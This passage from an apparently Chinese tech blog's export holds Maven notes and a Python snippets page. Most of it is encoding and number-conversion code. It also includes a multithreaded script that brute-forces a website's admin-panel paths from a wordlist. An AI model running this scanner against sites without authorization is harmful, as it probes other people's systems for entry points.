title="启动项目"></a>启动项目</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227223615824.png" alt="image-20211227223615824"></p><p>或者注释<code>&lt;connector&gt;</code>在<code>command line</code>中填写<code>jetty:run -Djetty.port=8899</code></p><h1 id="mvnrepository"><a href="#mvnrepository" class="headerlink" title="mvnrepository"></a>mvnrepository</h1><p><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227231748408.png" alt="image-20211227231748408"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227231733712.png" alt="image-20211227231733712"></p><h1 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h1><p>扫描漏洞类插件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.owasp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dependency-check-maven<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>check<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>执行<code>mvn verify</code>，结果如下：</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220106164052970.png" alt="image-20220106164052970"></p><h1 id="安装第三方JAR"><a href="#安装第三方JAR" class="headerlink" title="安装第三方JAR"></a>安装第三方JAR</h1><p><a href="https://maven.apache.org/guides/mini/guide-3rd-party-jars-local.html">官网地址</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -Dfile=&lt;path-to-file&gt; -DgroupId=&lt;group-id&gt; -DartifactId=&lt;artifact-id&gt; -Dversion=&lt;version&gt; -Dpackaging=&lt;packaging&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;path-to-file&gt;</code>为你jar包所在的路径<br><code>&lt;group-id&gt;</code>为grouId号，与<code>&lt;artifact-id&gt;</code>组成唯一识别你jar包的坐标，当不在公共资源jar包中，自己自定义的jar时，可以自定义groupId号<br><code>&lt;artifact-id&gt;</code>为artifactId号，与<code>&lt;group-id&gt;</code>组成唯一识别你jar包的坐标，当不在公共资源jar包中，自己自定义的jar时，可以自定义artifactId号<br><code>&lt;version&gt;</code>jar包版本号，也可以自定义<br><code>&lt;packaging&gt;</code>包的后缀，一般都是jar</p><h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="maven缺失ojdbc6解决方案"><a href="#maven缺失ojdbc6解决方案" class="headerlink" title="maven缺失ojdbc6解决方案"></a>maven缺失ojdbc6解决方案</h2><p>在<strong>cmd</strong>命令行输入以下命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -Dfile=D:/MavenRepo/ojdbc6.jar -DgroupId=com.oracle -DartifactId=ojdbc6 -Dversion=<span class="number">11</span>.<span class="number">2</span>.<span class="number">0</span>.<span class="number">4</span> -Dpackaging=jar -DgeneratePom=true</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220107154533805.png" alt="image-20220107154533805"></p><h2 id="IDEA中maven原型加载不出来"><a href="#IDEA中maven原型加载不出来" class="headerlink" title="IDEA中maven原型加载不出来"></a>IDEA中maven原型加载不出来</h2><p>解决方法来自<a href="https://blog.csdn.net/someInNeed/article/details/85109423">IDEA的不加载archetype list的问题和Maven 的41种骨架功能介绍</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Setting----&gt;Build Tools → Maven → Importing, set VM options for importer to -Xmx1024m (默认的是-Xmx512m )</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220119152827958.png" alt="image-20220119152827958"></p><p>删除<code>C:\Users\DropAnn\AppData\Local\JetBrains\IntelliJIdea2021.2\Maven\Indices</code>下面的文件夹</p><p>然后重启IDEA。</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python常用方法脚本</title>
      <link href="/p/7b3ac767.html"/>
      <url>/p/7b3ac767.html</url>
      
        <content type="html"><![CDATA[<h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><h2 id="base64编码导成二进制文件"><a href="#base64编码导成二进制文件" class="headerlink" title="base64编码导成二进制文件"></a>base64编码导成二进制文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">clzBytecodeBase64Str = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">newstr = base64.b64decode(clzBytecodeBase64Str)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(newstr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;somefile.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(newstr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;输出成功&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="后台扫描"><a href="#后台扫描" class="headerlink" title="后台扫描"></a>后台扫描</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = raw_input(<span class="string">&quot;输入你要扫描的网址:&quot;</span>)</span><br><span class="line">txt = raw_input(<span class="string">&quot;输入字典(php.txt):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存存在的后台地址</span></span><br><span class="line">open_url = []</span><br><span class="line">all_url = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立线程列表</span></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从字典中读取每一行与url组合，然后添加到all_url</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_url</span>(<span class="params">url,txt</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(txt,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f:</span><br><span class="line">            each = each.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            urllist = url + each</span><br><span class="line">            all_url.append(urllist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理url</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_url</span>(<span class="params">urllist</span>):</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;find：&quot;</span>+urllist+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req = urllib.urlopen(urllist)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断返回码</span></span><br><span class="line">        <span class="keyword">if</span> req.getcode() == <span class="number">200</span>:</span><br><span class="line">            open_url.append(urllist)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> req.getcode() == <span class="number">301</span>:</span><br><span class="line">            open_url.append(urllist)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    search_url(url,txt)</span><br><span class="line">    <span class="comment"># 多线程处理</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> all_url:</span><br><span class="line">        t = threading.Thread(target= handle_url, args=(each,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 线程等待</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 扫描成功和不成功的回显</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> open_url:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;扫描成功，网站后台地址为：&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> open_url:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+]&quot;</span>+each)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;没有扫到网站后台，字典不给力啊&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断运行时间</span></span><br><span class="line">    start = time.clock()</span><br><span class="line">    main()</span><br><span class="line">    end = time.clock()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;The function spend time is %.3f seconds&quot;</span> %(end-start))</span><br></pre></td></tr></table></figure><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><h2 id="hex-str"><a href="#hex-str" class="headerlink" title="hex-str"></a>hex-str</h2><h3 id="1-字符串转-hex-字符串"><a href="#1-字符串转-hex-字符串" class="headerlink" title="1. 字符串转 hex 字符串"></a>1. 字符串转 hex 字符串</h3><h4 id="字符串-gt-gt-二进制-gt-gt-hex-gt-gt-hex-字符串"><a href="#字符串-gt-gt-二进制-gt-gt-hex-gt-gt-hex-字符串" class="headerlink" title="字符串 &gt;&gt; 二进制 &gt;&gt; hex &gt;&gt; hex 字符串"></a>字符串 &gt;&gt; 二进制 &gt;&gt; hex &gt;&gt; hex 字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hexStr</span>(<span class="params">string</span>):</span></span><br><span class="line">    str_bin = string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(str_bin).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="2-hex-字符串转字符串"><a href="#2-hex-字符串转字符串" class="headerlink" title="2. hex 字符串转字符串"></a>2. hex 字符串转字符串</h3><h4 id="hex-字符串-gt-gt-hex-gt-gt-二进制-gt-gt-字符串"><a href="#hex-字符串-gt-gt-hex-gt-gt-二进制-gt-gt-字符串" class="headerlink" title="hex 字符串 &gt;&gt; hex &gt;&gt; 二进制 &gt;&gt; 字符串"></a>hex 字符串 &gt;&gt; hex &gt;&gt; 二进制 &gt;&gt; 字符串</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexStr_to_str</span>(<span class="params">hex_str</span>):</span></span><br><span class="line">    <span class="built_in">hex</span> = hex_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    str_bin = binascii.unhexlify(<span class="built_in">hex</span>)</span><br><span class="line">    <span class="keyword">return</span> str_bin.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="bytes-str"><a href="#bytes-str" class="headerlink" title="bytes-str"></a>bytes-str</h2><h3 id="str-gt-gt-bytes"><a href="#str-gt-gt-bytes" class="headerlink" title="str&gt;&gt;bytes"></a>str&gt;&gt;bytes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;demo&quot;</span></span><br><span class="line">b = a.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">b = <span class="built_in">bytes</span>(a.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">b = <span class="built_in">bytes</span>(a,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><h3 id="bytes-gt-gt-str"><a href="#bytes-gt-gt-str" class="headerlink" title="bytes&gt;&gt;str"></a>bytes&gt;&gt;str</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=b.decode(<span class="string">&quot;utf-8&quot;</span>)  或  c=<span class="built_in">str</span>(b,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="十进制–十六进制"><a href="#十进制–十六进制" class="headerlink" title="十进制–十六进制"></a>十进制–十六进制</h2><h3 id="十六进制–-gt-十进制"><a href="#十六进制–-gt-十进制" class="headerlink" title="十六进制–&gt;十进制"></a>十六进制–&gt;十进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;0xa&#x27;</span>,<span class="number">16</span>)         <span class="comment">#10</span></span><br><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;ff&#x27;</span>,<span class="number">16</span>)          <span class="comment">#255</span></span><br><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;f&#x27;</span>,<span class="number">16</span>)           <span class="comment">#15</span></span><br></pre></td></tr></table></figure><h3 id="十进制–-gt-十六进制"><a href="#十进制–-gt-十六进制" class="headerlink" title="十进制–&gt;十六进制"></a>十进制–&gt;十六进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hex</span>(<span class="number">10</span>)    <span class="comment">#&#x27;0xa&#x27;</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">11</span>)    <span class="comment">#&#x27;0xb&#x27;</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">15</span>)    <span class="comment">#&#x27;0xf&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="十进制–二进制"><a href="#十进制–二进制" class="headerlink" title="十进制–二进制"></a>十进制–二进制</h2><h3 id="十进制–-gt-二进制"><a href="#十进制–-gt-二进制" class="headerlink" title="十进制–&gt;二进制"></a>十进制–&gt;二进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bin</span>(<span class="number">2</span>)                <span class="comment">#&#x27;0b10&#x27;</span></span><br><span class="line"><span class="built_in">bin</span>(<span class="number">255</span>)              <span class="comment">#&#x27;0b11111111&#x27;</span></span><br><span class="line"><span class="built_in">bin</span>(<span class="number">8</span>)                <span class="comment">#&#x27;0b1000&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="二进制–-gt-十进制"><a href="#二进制–-gt-十进制" class="headerlink" title="二进制–&gt;十进制"></a>二进制–&gt;十进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;0b11111111&#x27;</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h2 id="十进制–八进制"><a href="#十进制–八进制" class="headerlink" title="十进制–八进制"></a>十进制–八进制</h2><h3 id="十进制–-gt-八进制"><a href="#十进制–-gt-八进制" class="headerlink" title="十进制–&gt;八进制"></a>十进制–&gt;八进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">oct</span>(<span class="number">8</span>)                <span class="comment">#&#x27;0o10&#x27;</span></span><br><span class="line"><span class="built_in">oct</span>(<span class="number">7</span>)                <span class="comment">#&#x27;0o7&#x27;</span></span><br><span class="line"><span class="built_in">oct</span>(<span class="number">9</span>)                <span class="comment">#&#x27;0o11&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="八进制–-gt-十进制"><a href="#八进制–-gt-十进制" class="headerlink" title="八进制–&gt;十进制"></a>八进制–&gt;十进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;0o11&#x27;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure><h2 id="字符串转换成整数"><a href="#字符串转换成整数" class="headerlink" title="字符串转换成整数"></a>字符串转换成整数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#十进制字符串转整数</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;10&#x27;</span>)             <span class="comment">#10</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;20&#x27;</span>)             <span class="comment">#20</span></span><br><span class="line">    <span class="comment">#十六进制字符串转整数</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;f&#x27;</span>,<span class="number">16</span>)           <span class="comment">#15</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;ff&#x27;</span>,<span class="number">16</span>)          <span class="comment">#255</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">16</span>)           <span class="comment">#10</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;11&#x27;</span>,<span class="number">16</span>)          <span class="comment">#17</span></span><br><span class="line">    <span class="comment">#二进制字符串转整数</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;1000&#x27;</span>,<span class="number">2</span>)         <span class="comment">#8</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;1001&#x27;</span>,<span class="number">2</span>)         <span class="comment">#9</span></span><br><span class="line">    <span class="comment">#字节串转整数</span></span><br><span class="line">    <span class="keyword">import</span> struct</span><br><span class="line">    struct.unpack(<span class="string">&#x27;&gt;II&#x27;</span>,<span class="built_in">bytes</span>(<span class="string">b&#x27;\x01\x00\x00\x00\x01\x00\x00\x00&#x27;</span>))             <span class="comment">#(16777216, 16777216)</span></span><br><span class="line">    <span class="comment">#整数转换成字节串</span></span><br><span class="line">    struct.pack(<span class="string">&#x27;&gt;II&#x27;</span>,<span class="number">16777216</span>, <span class="number">16777216</span>)                                       <span class="comment">#b&#x27;\x01\x00\x00\x00\x01\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="字符串转字节串"><a href="#字符串转字节串" class="headerlink" title="字符串转字节串"></a>字符串转字节串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字符串编码为字节码</span></span><br><span class="line">    <span class="string">&#x27;123abc&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)                  <span class="comment">#b&#x27;123abc&#x27;</span></span><br><span class="line">    <span class="string">&#x27;123abc&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)                  <span class="comment">#b&#x27;123abc&#x27;</span></span><br><span class="line">    <span class="string">&#x27;123abc好&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)                <span class="comment">#b&#x27;123abc\xe5\xa5\xbd&#x27;</span></span><br><span class="line">    <span class="comment">#十六进制字符串转字节串</span></span><br><span class="line">    <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;ff011a&#x27;</span>)                   <span class="comment">#b&#x27;\xff\x01\x1a&#x27;</span></span><br><span class="line">    <span class="comment">#十六进制字符串转字节串</span></span><br><span class="line">    <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="string">&#x27;\xff\x01\x1a&#x27;</span>))            <span class="comment">#b&#x27;\xff\x01\x1a&#x27;</span></span><br><span class="line">    <span class="comment">#十六进制数组转字节串</span></span><br><span class="line">    <span class="built_in">bytes</span>([<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0xff</span>])              <span class="comment">#b&#x27;\x01\x02\x03\xff&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="字节串转字符串"><a href="#字节串转字符串" class="headerlink" title="字节串转字符串"></a>字节串转字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字节码解码为字符串</span></span><br><span class="line">    <span class="built_in">bytes</span>(<span class="string">b&#x27;123abc\xe5\xa5\xbd&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)         <span class="comment">#&#x27;123abc好&#x27;</span></span><br><span class="line">    <span class="comment">#字节串转16进制表示</span></span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">bytes</span>(<span class="string">b&#x27;123abc\xe5\xa5\xbd&#x27;</span>))                    <span class="comment">#&quot;b&#x27;123abc\\xe5\\xa5\\xbd&#x27;&quot;</span></span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">bytes</span>(<span class="string">b&#x27;123abc\xe5\xa5\xbd&#x27;</span>))[<span class="number">2</span>:-<span class="number">1</span>]              <span class="comment">#&#x27;123abc\\xe5\\xa5\\xbd&#x27;</span></span><br><span class="line">    <span class="comment">#字节串转换成16进制数组</span></span><br><span class="line">    [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>(<span class="string">b&#x27;123&#x27;</span>)]                      <span class="comment">#[&#x27;0x31&#x27;, &#x27;0x32&#x27;, &#x27;0x33&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="字符串–二进制串（01形式表示）​"><a href="#字符串–二进制串（01形式表示）​" class="headerlink" title="字符串–二进制串（01形式表示）​"></a>字符串–二进制串（01形式表示）​</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">bin</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="built_in">int</span>(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>)]]) </span><br><span class="line">encode(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;1101000 1100101 1101100 1101100 1101111&#x27;</span></span><br><span class="line">decode(<span class="string">&#x27;1101000 1100101 1101100 1101100 1101111&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> &gt;&gt;&gt; <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;256&#x27;</span>, <span class="number">10</span>))</span><br><span class="line"><span class="number">2.</span> <span class="string">&#x27;0b100000000&#x27;</span></span><br><span class="line"><span class="number">3.</span> &gt;&gt;&gt; <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&#x27;0b100000000&#x27;</span>, <span class="number">2</span>))</span><br><span class="line"><span class="number">4.</span> <span class="string">&#x27;256&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet</title>
      <link href="/p/1401e6d1.html"/>
      <url>/p/1401e6d1.html</url>
      
